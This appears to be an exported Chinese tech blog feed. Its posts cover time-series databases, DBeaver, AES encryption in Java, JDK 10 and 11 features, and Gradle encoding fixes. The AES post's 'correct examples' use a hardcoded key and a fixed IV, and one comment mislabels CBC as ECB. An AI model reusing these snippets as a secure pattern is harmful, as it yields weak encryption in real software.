<h2 id="TSDB时序数据库的选择"><a href="#TSDB时序数据库的选择" class="headerlink" title="TSDB时序数据库的选择"></a>TSDB时序数据库的选择</h2><p>OpenTSDB是可扩展的分布式时序数据库，底层依赖HBase。作为基于通用存储开发的时序数据库典型代表，起步比较早，在时序市场的认可度相对较高。阿里云智能TSDB高度兼容OpenTSDB协议，采用自研的索引，数据模型，流式聚合等技术手段提供更强大的时序能力。</p>
<p>TSDB For InfluxDB®是一款专门处理高写入和查询负载的时序数据库，无需外部依赖，用于存储大规模的时序数据并进行实时分析，包括来自DevOps监控、应用指标和IoT传感器上的数据。</p>
]]></content>
      <categories>
        <category>IoT</category>
      </categories>
  </entry>
  <entry>
    <title>免费的多平台数据库工具DBeaver</title>
    <url>/IDE/%E5%85%8D%E8%B4%B9%E7%9A%84%E5%A4%9A%E5%B9%B3%E5%8F%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<blockquote>
<p>数据库工具最好不要用破解的，连接生产环境的数据库风险还是很大的。</p>
</blockquote>
<p>免费的多平台数据库工具<a href="https://dbeaver.io/" target="_blank" rel="noopener">【DBeaver】</a>，功能很强大，支持多种SQL数据库。</p>
<blockquote>
<p>版本21.2.0.202108310918</p>
</blockquote>
<p>DBeaver是Java开发的，所以支持Windows、Linux、MacOS多平台，提供安装包和免安装的压缩包。</p>
<p>DBeaver有社区免费版和企业收费版本，社区版只有基础功能，企业版拥有更多的功能：</p>
<ul>
<li>NoSQL 和 BigData 支持  (MongoDB / InfluxDB / Redis)</li>
<li>可视化查询构建器  </li>
<li>分析图表  </li>
<li>查询历史  </li>
<li>所有主要驱动程序包 </li>
<li><a href="https://dbeaver.com/features/" target="_blank" rel="noopener">【更多请阅读】</a></li>
</ul>
<p>以下是社区版支持的数据库（有点多！！！）：</p>
<p><img src="/images/数据库/DBeaver1.png" alt></p>
<p><img src="/images/数据库/DBeaver2.png" alt></p>
<p>但是社区版不支持NoSQL（Redis、MongoDB等）</p>
<p><img src="/images/数据库/DBeaver3.png" alt></p>
<p>这是连接MySQL的操作界面</p>
<p><img src="/images/数据库/DBeaver4.png" alt></p>
<p>DBeaver是Java写的，所以对数据库的支持肯定离不开底层JDBC数据库驱动，DBeaver社区版不会在安装的时候打包所有的驱动，而是用户连接数据库时，如果本地没有相关驱动时下载。</p>
<p><img src="/images/数据库/DBeaver5.png" alt></p>
]]></content>
      <categories>
        <category>IDE</category>
      </categories>
  </entry>
  <entry>
    <title>AES加密实践</title>
    <url>/Java/AES%E5%8A%A0%E5%AF%86%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<p>有项目对AES对称加密有需求，使用Java使用Aes过程中有些坑是要注意一下的。</p>
<h2 id="跨平台问题"><a href="#跨平台问题" class="headerlink" title="跨平台问题"></a>跨平台问题</h2><p>AES是对称加密，利用秘钥，可以对内容加密和解密，于是我在PC开发电脑上尝试以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encrypt(String content, String password) &#123;</span><br><span class="line">     KeyGenerator kgen = KeyGenerator.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">     kgen.init(<span class="number">128</span>, <span class="keyword">new</span> SecureRandom(password.getBytes()));</span><br><span class="line">     SecretKey secretKey = kgen.generateKey();</span><br><span class="line">     <span class="keyword">byte</span>[] enCodeFormat = secretKey.getEncoded();</span><br><span class="line">     SecretKeySpec key = <span class="keyword">new</span> SecretKeySpec(enCodeFormat, <span class="string">"AES"</span>);</span><br><span class="line">     Cipher cipher = Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">     <span class="keyword">byte</span>[] byteContent = content.getBytes(<span class="string">"utf-8"</span>);</span><br><span class="line">     cipher.init(Cipher.ENCRYPT_MODE, key);</span><br><span class="line">     <span class="keyword">return</span> cipher.doFinal(byteContent);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] content, String password) &#123;</span><br><span class="line">     KeyGenerator kgen = KeyGenerator.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">     kgen.init(<span class="number">128</span>, <span class="keyword">new</span> SecureRandom(password.getBytes()));</span><br><span class="line">     SecretKey secretKey = kgen.generateKey();</span><br><span class="line">     <span class="keyword">byte</span>[] enCodeFormat = secretKey.getEncoded();</span><br><span class="line">     SecretKeySpec key = <span class="keyword">new</span> SecretKeySpec(enCodeFormat, <span class="string">"AES"</span>);</span><br><span class="line">     Cipher cipher = Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">     cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">     <span class="keyword">return</span> cipher.doFinal(content);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>这段代码在本机加密和解密都没问题，是正常的，但如果跨机器执行很大概率会解密失败，这是由于不同机器很大概率是安装了不同平台厂商的JDK和版本（特别是Android 平台）。</p>
<p>这是由于：上面的代码只是指定了”AES”加密，而”AES”的默认实现，不同的JDK实现不一样。</p>
<p><strong> 先了解一下AES加密：</strong> </p>
<ul>
<li>秘钥长度：128位/192位/256位</li>
<li>加密模式有：ECB/CBC/CTR/OFB/CFB</li>
<li>补码填充模式有：pkcs5padding/pkcs7padding/zeropadding/nopadding/iso10126/ansix923</li>
</ul>
<p>所以上面代码到底用的是哪一种？是由JDK决定的。 推荐的代码写法是：指定所有配置项，如”AES/ECB/PKCS5Padding”</p>
<p>接下来了解一下AES对称加密…..</p>
<h2 id="秘钥长度"><a href="#秘钥长度" class="headerlink" title="秘钥长度"></a>秘钥长度</h2><p>AES支持三种长度的密钥： 128位，192位，256位。<br>AES256安全性最高，AES128性能最高。</p>
<h2 id="加密模式"><a href="#加密模式" class="headerlink" title="加密模式"></a>加密模式</h2><p>AES加密模式有两个是最常用的，ECB 和 CBC，本文就说一下这两个。</p>
<ul>
<li>ECB 电码本模式(Electronic Codebook Book)： 简单快速利于计算的加密模式，但不太安全，加密时只需要密码。</li>
<li>CBC 密码分组链接模式(Cipher Block Chaining): 安全性很高的加密模式，是SSL、IPSec的标准，加密时需要密码和初始化向量IV。</li>
</ul>
<h2 id="补码填充"><a href="#补码填充" class="headerlink" title="补码填充"></a>补码填充</h2><ul>
<li>NoPadding： 不做任何填充，但是要求明文必须是16字节的整数倍，所以要自己补码。</li>
<li>PKCS5Padding（默认）： 如果明文块少于16个字节（128bit），在明文块末尾补足相应数量的字符，且每个字节的值等于缺少的字符数。 比如明文：<code>{1,2,3,4,5,a,b,c,d,e}</code> ,缺少6个字节，则补全为 <code>{1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6 }</code></li>
<li>PKCS7Padding原理与PKCS5Padding相似，区别是PKCS5Padding的blocksize为8字节，而PKCS7Padding的blocksize可以为1到255字节</li>
<li>ISO10126Padding：如果明文块少于16个字节（128bit），在明文块末尾补足相应数量的字节，最后一个字符值等于缺少的字符数，其他字符填充随机数。比如明文：<code>{1,2,3,4,5,a,b,c,d,e}</code>,缺少6个字节，则可能补全为 <code>{1,2,3,4,5,a,b,c,d,e,5,c,3,G,$,6}</code></li>
</ul>
<h2 id="正确示例"><a href="#正确示例" class="headerlink" title="正确示例"></a>正确示例</h2><p><strong>ECB示例</strong><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> KEY_LEN = <span class="number">16</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String CIP_TYPE_PKCS5_PADDING = <span class="string">"AES/ECB/PKCS5Padding"</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 此处使用AES-128-ECB加密模式，passwd需要为16位。</span></span><br><span class="line">     String passwd = <span class="string">"1234567890123456"</span>;</span><br><span class="line">     String src = <span class="string">"hello world!hello world!hello world!hello world!hello world!hello world!"</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 加密</span></span><br><span class="line">     <span class="keyword">byte</span>[] enByte = encrypt(src, passwd,CIP_TYPE_PKCS5_PADDING);</span><br><span class="line">     String enString = Base64.getEncoder().encodeToString(enByte);</span><br><span class="line">     System.out.println(<span class="string">"加密后的字串是："</span> + enString);</span><br><span class="line">     <span class="comment">// 解密</span></span><br><span class="line">     String deString = decrypt(enByte, passwd,CIP_TYPE_PKCS5_PADDING);</span><br><span class="line">     System.out.println(<span class="string">"解密后的字串是："</span> + deString);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 加密</span></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encrypt(String src, String passwd,String cipherType) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">     Cipher cipher = Cipher.getInstance(cipherType);</span><br><span class="line">     cipher.init(Cipher.ENCRYPT_MODE, generateSecretKeySpec(passwd));</span><br><span class="line">     <span class="keyword">return</span> cipher.doFinal(src.getBytes(StandardCharsets.UTF_8));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 解密</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] encrypt, String passwd,String cipherType)</span>  </span>&#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">         Cipher cipher = Cipher.getInstance(cipherType);</span><br><span class="line">         cipher.init(Cipher.DECRYPT_MODE, generateSecretKeySpec(passwd));</span><br><span class="line">         <span class="keyword">byte</span>[] original = cipher.doFinal(encrypt);</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> String(original,StandardCharsets.UTF_8);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">         ex.printStackTrace();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> SecretKeySpec <span class="title">generateSecretKeySpec</span><span class="params">(String passwd)</span> <span class="keyword">throws</span> UnsupportedEncodingException </span>&#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 判断Key是否为16位</span></span><br><span class="line">     <span class="keyword">if</span> (passwd == <span class="keyword">null</span> ||passwd.length() != KEY_LEN) &#123;</span><br><span class="line">         System.out.print(<span class="string">"passwd长度不是"</span> + KEY_LEN);</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> SecretKeySpec(passwd.getBytes(StandardCharsets.UTF_8), <span class="string">"AES"</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>CBC示例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> KEY_LEN = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String CIP_TYPE_CBC_PKCS5_PADDING = <span class="string">"AES/CBC/PKCS5Padding"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此处使用AES-128-ECB加密模式，passwd需要为16位。</span></span><br><span class="line">    String passwd = <span class="string">"1234567890123456"</span>;</span><br><span class="line">    <span class="comment">//密钥默认偏移，最少16位</span></span><br><span class="line">    String iv = <span class="string">"abcdabcdabcdabcd"</span>;</span><br><span class="line">    String src = <span class="string">"hello world!hello world!hello world!hello world!hello world!hello world!"</span>;<span class="comment">//长度非16倍数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密</span></span><br><span class="line">    <span class="keyword">byte</span>[] enByte = encrypt(src, passwd,iv,CIP_TYPE_CBC_PKCS5_PADDING);</span><br><span class="line">    String enString = Base64.getEncoder().encodeToString(enByte);</span><br><span class="line">    System.out.println(<span class="string">"加密后的字串是："</span> + enString);</span><br><span class="line">    <span class="comment">// 解密</span></span><br><span class="line">    String deString = decrypt(enByte, passwd,iv,CIP_TYPE_CBC_PKCS5_PADDING);</span><br><span class="line">    System.out.println(<span class="string">"解密后的字串是："</span> + deString);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encrypt(String src, String passwd, String iv, String cipherType) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Cipher c = Cipher.getInstance(cipherType);</span><br><span class="line">    c.init(Cipher.ENCRYPT_MODE, generateSecretKeySpec(passwd), <span class="keyword">new</span> IvParameterSpec(iv.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">    <span class="keyword">return</span> c.doFinal(src.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] encrypt,String passwd, String iv, String cipherType)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Cipher c = Cipher.getInstance(cipherType);</span><br><span class="line">        c.init(Cipher.DECRYPT_MODE, generateSecretKeySpec(passwd), <span class="keyword">new</span> IvParameterSpec(iv.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(c.doFinal(encrypt),StandardCharsets.UTF_8);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> SecretKeySpec <span class="title">generateSecretKeySpec</span><span class="params">(String passwd)</span><span class="keyword">throws</span> UnsupportedEncodingException</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断Key是否为16位</span></span><br><span class="line">    <span class="keyword">if</span> (passwd == <span class="keyword">null</span> ||passwd.length() != KEY_LEN) &#123;</span><br><span class="line">        System.out.print(<span class="string">"passwd长度不是"</span> + KEY_LEN);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> SecretKeySpec(passwd.getBytes(StandardCharsets.UTF_8), <span class="string">"AES"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title>JDK 10 新特性</title>
    <url>/Java/JDK%2010%20%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p>2018年3月20日 <code>JDK 10</code> 发布，非LTS 版本。</p>
<p><a href="http://openjdk.java.net/projects/jdk/10/" target="_blank" rel="noopener">新特性</a></p>
<ul>
<li>286: Local-Variable Type Inference</li>
<li>296: Consolidate the JDK Forest into a Single Repository</li>
<li>304: Garbage-Collector Interface</li>
<li>307: Parallel Full GC for G1</li>
<li>310: Application Class-Data Sharing</li>
<li>312: Thread-Local Handshakes</li>
<li>313: Remove the Native-Header Generation Tool (javah)</li>
<li>314: Additional Unicode Language-Tag Extensions</li>
<li>316: Heap Allocation on Alternative Memory Devices</li>
<li>317: Experimental Java-Based JIT Compiler</li>
<li>319: Root Certificates</li>
<li>322: Time-Based Release Versioning</li>
</ul>
<p>中文</p>
<ul>
<li>286: 局部变量类型推断 (var x = “hello”)</li>
<li>296: Consolidate the JDK Forest into a Single Repository</li>
<li>304: Garbage-Collector Interface</li>
<li>307: G1并行全垃圾回收器 Parallel Full GC for G1</li>
<li>310: 应用类数据共享(CDS)</li>
<li>312: 线程-局部变量管控 </li>
<li>313: 删除 Native-Header 自动生成工具 (javah)</li>
<li>314: 额外的 Unicode 语言标签扩展</li>
<li>316: 在备用存储装置上的堆分配</li>
<li>317: 试验性的基于 Java 的 JIT 编译器</li>
<li>319: 根证书Root Certificates</li>
<li>322: 基于时间的版本控制</li>
</ul>
<hr>
<p>Java 10 正式发布于 2018 年 3 月 21 日，Java 10 版本带来了很多新特性，其中最备受广大开发者关注的莫过于局部变量类型推断。除此之外，还有其他包括垃圾收集器改善、GC 改进、性能提升、线程管控等一批新特性。</p>
<h2 id="局部变量类型推断"><a href="#局部变量类型推断" class="headerlink" title="局部变量类型推断"></a>局部变量类型推断</h2><p>局部变量类型推断是 Java 10 中最值得开发人员注意的新特性，这是 Java 语言开发人员为了简化 Java 应用程序的编写而进行的又一重要改进。</p>
<p>这一新功能将为 Java 增加一些新语法，允许开发人员省略通常不必要的局部变量类型初始化声明。新的语法将减少 Java 代码的冗长度，同时保持对静态类型安全性的承诺。局部变量类型推断主要是向 Java 语法中引入在其他语言（比如 C#、JavaScript）中很常见的保留类型名称 var。但需要特别注意的是：var 不是一个关键字，而是一个保留字。只要编译器可以推断此种类型，开发人员不再需要专门声明一个局部变量的类型，也就是可以随意定义变量而不必指定变量的类型。这种改进对于链式表达式来说，也会很方便。以下是一个简单的例子：<br>清单 1. 局部变量类型推断示例<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> list = <span class="keyword">new</span> ArrayList&lt;String&gt;(); <span class="comment">// ArrayList&lt;String&gt;</span></span><br><span class="line"><span class="keyword">var</span> stream = list.stream(); <span class="comment">// Stream&lt;String&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>看着是不是有点 JS 的感觉？有没有感觉越来越像 JS 了？虽然变量类型的推断在 Java 中不是一个崭新的概念，但在局部变量中确是很大的一个改进。说到变量类型推断，从 Java 5 中引进泛型，到 Java 7 的 &lt;&gt; 操作符允许不绑定类型而初始化 List，再到 Java 8 中的 Lambda 表达式，再到现在 Java 10 中引入的局部变量类型推断，Java 类型推断正大刀阔斧地向前进步、发展。</p>
<p>而上面这段例子，在以前版本的 Java 语法中初始化列表的写法为：<br>清单 2. Java 类型初始化示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">Stream&lt;String&gt; stream = getStream();</span><br></pre></td></tr></table></figure>
<p>在运算符允许在没有绑定 ArrayList &lt;&gt; 的类型的情况下初始化列表的写法为：<br>清单 3. Java 7 之后版本类型初始化示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">Stream&lt;String&gt; stream = getStream();</span><br></pre></td></tr></table></figure>
<p>但这种 var 变量类型推断的使用也有局限性，仅局限于具有初始化器的局部变量、增强型 for 循环中的索引变量以及在传统 for 循环中声明的局部变量，而不能用于推断方法的参数类型，不能用于构造函数参数类型推断，不能用于推断方法返回类型，也不能用于字段类型推断，同时还不能用于捕获表达式（或任何其他类型的变量声明）。</p>
<p>不过对于开发者而言，变量类型显式声明会提供更加全面的程序语言信息，对于理解和维护代码有很大的帮助。Java 10 中新引入的局部变量类型推断能够帮助我们快速编写更加简洁的代码，但是局部变量类型推断的保留字 var 的使用势必会引起变量类型可视化缺失，并不是任何时候使用 var 都能容易、清晰的分辨出变量的类型。一旦 var 被广泛运用，开发者在没有 IDE 的支持下阅读代码，势必会对理解程序的执行流程带来一定的困难。所以还是建议尽量显式定义变量类型，在保持代码简洁的同时，也需要兼顾程序的易读性、可维护性。</p>
<h2 id="根证书认证"><a href="#根证书认证" class="headerlink" title="根证书认证"></a>根证书认证</h2><p>自 Java 9 起在 keytool 中加入参数 -cacerts，可以查看当前 JDK 管理的根证书。而 Java 9 中 cacerts 目录为空，这样就会给开发者带来很多不便。从 Java 10 开始，将会在 JDK 中提供一套默认的 CA 根证书。</p>
<p>作为 JDK 一部分的 cacerts 密钥库旨在包含一组能够用于在各种安全协议的证书链中建立信任的根证书。但是，JDK 源代码中的 cacerts 密钥库至目前为止一直是空的。因此，在 JDK 构建中，默认情况下，关键安全组件（如 TLS）是不起作用的。要解决此问题，用户必须使用一组根证书配置和 cacerts 密钥库下的 CA 根证书。</p>
<h2 id="其他特性"><a href="#其他特性" class="headerlink" title="其他特性"></a>其他特性</h2><p>其他的看不懂，不写出来了。</p>
<p>更多信息请看 <a href="https://www.oschina.net/translate/109-new-features-in-jdk-10" target="_blank" rel="noopener">Java 10 新特性介绍</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>Gradle项目中文乱码</title>
    <url>/Java/Gradle%E9%A1%B9%E7%9B%AE%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/</url>
    <content><![CDATA[<p>在Windows下Idea新建的Gradle纯Java项目，运行和编译时一些中文信息总是乱码；最近Android Studio升级Gradle为 6.0+ ,编译时也会出现中文乱码，如果apk名称带有中文，在AS中debug运行直接报错（<code>The application could not be installed.  Installation failed due to: &#39;Invalid File:</code>）</p>
<p><strong>这里记录一下几种方法：</strong></p>
<ol>
<li>修改Idea全局设置</li>
</ol>
<p><code>Help</code> —&gt; <code>Edit Custom VM Options</code> -&gt; 输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure>
<p>重启Idea，最好是 <code>Invalidata Cacjes /Restart</code></p>
<ol start="2">
<li><p>在gradle.properties中加入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure>
</li>
<li><p>在build.gradle加入</p>
</li>
</ol>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">compileJava.<span class="keyword">options</span>.encoding = <span class="string">'UTF-8'</span></span><br><span class="line">compileTestJava.<span class="keyword">options</span>.encoding = <span class="string">'UTF-8'</span></span><br><span class="line"></span><br><span class="line">tasks.withType(JavaCompile)&#123;</span><br><span class="line">    <span class="keyword">options</span>.encoding =<span class="string">"utf-8"</span></span><br><span class="line">&#125;</span><br><span class="line">tasks.withType(Javadoc)&#123;</span><br><span class="line">    <span class="keyword">options</span>.encoding = <span class="string">"utf-8"</span></span><br><span class="line">    <span class="keyword">options</span>.charSet = <span class="string">"utf-8"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Gradle</tag>
      </tags>
  </entry>
  <entry>
    <title>JDK 11 新特性</title>
    <url>/Java/JDK%2011%20%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p>2018年9月25日 <code>JDK 11</code> 发布，LTS 版本。</p>
<p><a href="http://openjdk.java.net/projects/jdk/11/" target="_blank" rel="noopener">新特性</a></p>
<ul>
<li>181: Nest-Based Access Control</li>
<li>309: Dynamic Class-File Constants</li>
<li>315: Improve Aarch64 Intrinsics</li>
<li>318: Epsilon: A No-Op Garbage Collector</li>
<li>320: Remove the Java EE and CORBA Modules</li>
<li>321: HTTP Client (Standard)</li>
<li>323: Local-Variable Syntax for Lambda Parameters</li>
<li>324: Key Agreement with Curve25519 and Curve448</li>
<li>327: Unicode 10</li>
<li>328: Flight Recorder</li>
<li>329: ChaCha20 and Poly1305 Cryptographic Algorithms</li>
<li>330: Launch Single-File Source-Code Programs</li>
<li>331: Low-Overhead Heap Profiling</li>
<li>332: Transport Layer Security (TLS) 1.3</li>
<li>333: ZGC: A Scalable Low-Latency Garbage Collector (Experimental)</li>
<li>335: Deprecate the Nashorn JavaScript Engine</li>
<li>336: Deprecate the Pack200 Tools and API</li>
</ul>
<p>中文</p>
<ul>
<li>181: 基于嵌套的访问控制</li>
<li>309: 动态类文件常量</li>
<li>315: 改进 Aarch64 Intrinsics</li>
<li>318: Epsilon: 一个无操作的垃圾收集器</li>
<li>320: 删除 Java EE and CORBA Modules</li>
<li>321: HTTP Client (Standard)</li>
<li>323: 用于 Lambda 参数的局部变量语法</li>
<li>324: 新增 Curve25519 and Curve448 算法的密钥协议</li>
<li>327: Unicode 10</li>
<li>328: 飞行记录器 Flight Recorder</li>
<li>329: ChaCha20 and Poly1305 加密算法</li>
<li>330: 启动单一文件的源代码程序</li>
<li>331: 低开销的 Heap Profiling</li>
<li>332: 支持 TLS 1.3</li>
<li>333: ZGC: 可伸缩低延迟垃圾收集器</li>
<li>335: 弃用 the Nashorn JavaScript Engine</li>
<li>336: 弃用 the Pack200 Tools and API</li>
</ul>
<p>从这个版本开始，我已习惯用 <code>oracle openjdk</code> 了，由于2019年1月开始，<code>Oracle JDK</code> 会收取商用费用（参考：<a href="https://mp.weixin.qq.com/s/gRtOaTXdLYVrIPnejVytMw" target="_blank" rel="noopener">【Oracle要对JDK8收费】</a>），<code>openjdk</code> 发展的更好了，虽然它也是Oracle的。</p>
<hr>
<p>Java 11 已于 2018 年 9 月 25 日正式发布，与 Java 9 和 Java 10 这两个被称为”功能性的版本”不同，Java 11 仅将提供长期支持服务（LTS, Long-Term-Support），还将作为 Java 平台的默认支持版本，并且会提供技术支持直至 2023 年 9 月，对应的补丁和安全警告等支持将持续至 2026 年。</p>
<h2 id="标准-HTTP-Client-升级"><a href="#标准-HTTP-Client-升级" class="headerlink" title="标准 HTTP Client 升级"></a>标准 HTTP Client 升级</h2><p>Java 11 对 Java 9 中引入并在 Java 10 中进行了更新的 Http Client API 进行了标准化，在前两个版本中进行孵化的同时，Http Client 几乎被完全重写，并且现在完全支持异步非阻塞。</p>
<p>新版 Java 中，Http Client 的包名由 jdk.incubator.http 改为 java.net.http，该 API 通过 CompleteableFutures 提供非阻塞请求和响应语义，可以联合使用以触发相应的动作，并且 RX Flow 的概念也在 Java 11 中得到了实现。现在，在用户层请求发布者和响应发布者与底层套接字之间追踪数据流更容易了。这降低了复杂性，并最大程度上提高了 HTTP / 1 和 HTTP / 2 之间的重用的可能性。</p>
<p>Java 11 中的新 Http Client API，提供了对 HTTP/2 等业界前沿标准的支持，同时也向下兼容 HTTP/1.1，精简而又友好的 API 接口，与主流开源 API（如：Apache HttpClient、Jetty、OkHttp 等）类似甚至拥有更高的性能。与此同时它是 Java 在 Reactive-Stream 方面的第一个生产实践，其中广泛使用了 Java Flow API，终于让 Java 标准 HTTP 类库在扩展能力等方面，满足了现代互联网的需求，是一个难得的现代 Http/2 Client API 标准的实现，Java 工程师终于可以摆脱老旧的 HttpURLConnection 了。下面模拟 Http GET 请求并打印返回内容：</p>
<p>清单 1. GET 请求示例<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HttpClient client = HttpClient.newHttpClient();</span><br><span class="line">HttpRequest request = HttpRequest.newBuilder()</span><br><span class="line">      .uri(URI.create(<span class="string">"http://openjdk.java.net/"</span>))</span><br><span class="line">      .build();</span><br><span class="line">client.sendAsync(request, BodyHandlers.ofString())</span><br><span class="line">      .thenApply(HttpResponse::body)</span><br><span class="line">      .thenAccept(System.out::println)</span><br><span class="line">      .join();</span><br></pre></td></tr></table></figure></p>
<h2 id="简化启动单个源代码文件的方法"><a href="#简化启动单个源代码文件的方法" class="headerlink" title="简化启动单个源代码文件的方法"></a>简化启动单个源代码文件的方法</h2><p>Java 11 版本中最令人兴奋的功能之一是增强 Java 启动器，使之能够运行单一文件的 Java 源代码。此功能允许使用 Java 解释器直接执行 Java 源代码。源代码在内存中编译，然后由解释器执行。唯一的约束在于所有相关的类必须定义在同一个 Java 文件中。</p>
<p>此功能对于开始学习 Java 并希望尝试简单程序的人特别有用，并且能与 jshell 一起使用，将成为任何初学者学习语言的一个很好的工具集。不仅初学者会受益，专业人员还可以利用这些工具来探索新的语言更改或尝试未知的 API。</p>
<p>如今单文件程序在编写小实用程序时很常见，特别是脚本语言领域。从中开发者可以省去用 Java 编译程序等不必要工作，以及减少新手的入门障碍。在基于 Java 10 的程序实现中可以通过三种方式启动：</p>
<ul>
<li>作为 * .class 文件</li>
<li>作为 * .jar 文件中的主类</li>
<li>作为模块中的主类</li>
</ul>
<p>而在最新的 Java 11 中新增了一个启动方式，即可以在源代码中声明类，例如：如果名为 HelloWorld.java 的文件包含一个名为 hello.World 的类，那么该命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> java HelloWorld.java</span></span><br></pre></td></tr></table></figure>
<p>也等同于：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> javac HelloWorld.java</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> java -cp . hello.World</span></span><br></pre></td></tr></table></figure></p>
<h2 id="用于-Lambda-参数的局部变量语法"><a href="#用于-Lambda-参数的局部变量语法" class="headerlink" title="用于 Lambda 参数的局部变量语法"></a>用于 Lambda 参数的局部变量语法</h2><p>在 Lambda 表达式中使用局部变量类型推断是 Java 11 引入的唯一与语言相关的特性。</p>
